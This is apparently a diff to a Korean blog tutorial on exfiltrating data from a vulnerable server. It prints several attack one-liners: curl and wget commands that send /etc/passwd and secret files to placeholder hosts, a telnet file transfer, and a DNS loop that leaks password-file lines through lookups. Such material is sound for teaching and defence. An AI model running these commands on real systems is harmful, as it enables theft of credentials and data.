@@ -69,7 +69,7 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 cURL은 다양한 프로토콜을 사용하여 데이터를 전송하는 라이브러리 및 명령 줄 도구이며 데이터 추출을위한 매우 유용한 도구다. 취약한 서버에 cURL이 있으면 악의적인 웹 서버에 파일을 POST하거나 FTP / SCP / TFTP / TELNET 등의 프로토콜을 사용하여 파일을 전송할 수 있다.
 
 - 사용법 : https://en.wikipedia.org/wiki/CURL
-- cat /path/to/file | curl –F “:data=@-“ http://xxx.xxx.xxx.xxxx:xxxx/test.txt
+-  cat /path/to/file | curl –F “:data=@-“ http://xxx.xxx.xxx.xxxx:xxxx/test.txt
 
 <img src="{{ site.url }}/images/2017-03-12/four.png" style="display: block; margin: auto;">
 
@@ -98,11 +98,11 @@ Wget은 웹에서 파일을 비 대화식으로 다운로드 할 때 일반적�
 
 추가적으로 사용할 수 있는 명령어는 아래와 같다.
 
-- wget –header=”evil:`cat /etc/passwd | xargs echo –n`” http://xxx.xxx.xxx:xxxx
+- wget –header=”evil:\`cat /etc/passwd | xargs echo –n`” http://xxx.xxx.xxx:xxxx
 
 <img src="{{ site.url }}/images/2017-03-12/seven.png" style="display: block; margin: auto;">
 
-- wget –post-data exfil=`cat /data/secret/secretcode.txt` http://xxx.xxx.xxx.xxx:xxxx
+- wget –post-data exfil=\`cat /data/secret/secretcode.txt` http://xxx.xxx.xxx.xxx:xxxx
 
 <img src="{{ site.url }}/images/2017-03-12/eight.png" style="display: block; margin: auto;">
 
@@ -128,7 +128,7 @@ Windows 운영체제를 사용하는 PC에서 Linux 또는 UNIX 서버에 접속
 TELNET 프로토콜은 원격에서 쉘에 접근할 수 있는 서비스를 제공한다. 23번 Default Port를 사용하고 있으며, 평문 전송을 통해 데이터를 전달 하게 된다. (대부분 한번 쯤 써본 서비스...)
 
 - 사용법 : https://en.wikipedia.org/wiki/Telnet
-- telnet xxx.xxx.xxx.xxx {port} < {file to transfer}
+-  telnet xxx.xxx.xxx.xxx {port} < {file to transfer}
 
 <img src="{{ site.url }}/images/2017-03-12/eleven.png" style="display: block; margin: auto;">
 
@@ -152,7 +152,7 @@ ICMP 프로토콜은 목적지 IP에 대해 상태를 점검 하거나, manageme
 
 DNS 프로토콜은 Domain name에 해당하는 IP 주소를 DNS 서버에 요청하여, 목적지 URL의 IP를 알아 오는 역할이다.
 
-- cat /data/secret/password.txt | while read exfil; do host $exfil.contextis.com 192.168.107.135; done
+-  cat /data/secret/password.txt | while read exfil; do host $exfil.contextis.com 192.168.107.135; done
 
 <img src="{{ site.url }}/images/2017-03-12/15.png" style="display: block; margin: auto;">
 
